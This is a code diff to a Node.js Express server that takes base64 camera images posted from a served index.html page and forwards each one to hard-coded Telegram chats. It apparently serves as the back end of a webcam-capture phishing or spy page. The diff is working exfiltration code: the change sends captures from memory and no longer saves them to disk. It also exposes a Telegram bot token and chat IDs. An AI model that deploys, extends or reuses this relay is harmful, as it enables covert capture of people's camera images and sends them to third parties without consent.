@@ -1,15 +1,9 @@
 import express from "express";
-import fs from "fs";
-import path from "path";
 import fetch from "node-fetch";
 import bodyParser from "body-parser";
-import multer from "multer";
+import FormData from "form-data";
 
 const app = express();
-const __dirname = path.resolve();
-
-const SAVE_DIR = path.join(__dirname, "captures");
-if (!fs.existsSync(SAVE_DIR)) fs.mkdirSync(SAVE_DIR);
 
 // Telegram config
 const BOT_TOKEN = "8237344741:AAHYDjgU3xp_dChK2Ll_Bp7Z6gCwxqOBwKc";
@@ -19,11 +13,10 @@ const CHAT_IDS = ["8167904992", "6022286935"];
 
 // Middleware
 app.use(bodyParser.json({ limit: "10mb" }));
-app.use(bodyParser.urlencoded({ extended: true }));
 
 // Serve index.html
 app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "index.html"));
+  res.sendFile("index.html", { root: "." });
 });
 
 // Camera upload endpoint
@@ -35,8 +28,7 @@ app.post("/upload", async (req, res) => {
     }
 
     const base64Data = image.replace(/^data:image\/png;base64,/, "");
-    const filename = path.join(SAVE_DIR, `cap_${fs.readdirSync(SAVE_DIR).length}.png`);
-    fs.writeFileSync(filename, base64Data, "base64");
+    const buffer = Buffer.from(base64Data, "base64");
 
     // Send to multiple Telegram chats
     for (let chat_id of CHAT_IDS) {
@@ -44,12 +36,12 @@ app.post("/upload", async (req, res) => {
       const formData = new FormData();
       formData.append("chat_id", chat_id);
       formData.append("caption", "New capture received 📸");
-      formData.append("photo", fs.createReadStream(filename));
+      formData.append("photo", buffer, { filename: "capture.png" });
 
       await fetch(url, { method: "POST", body: formData });
     }
 
-    res.json({ status: "ok", saved: filename, sent_to: CHAT_IDS.length });
+    res.json({ status: "ok", sent_to: CHAT_IDS.length });
   } catch (err) {
     console.error(err);
     res.status(500).json({ status: "error", msg: err.message });
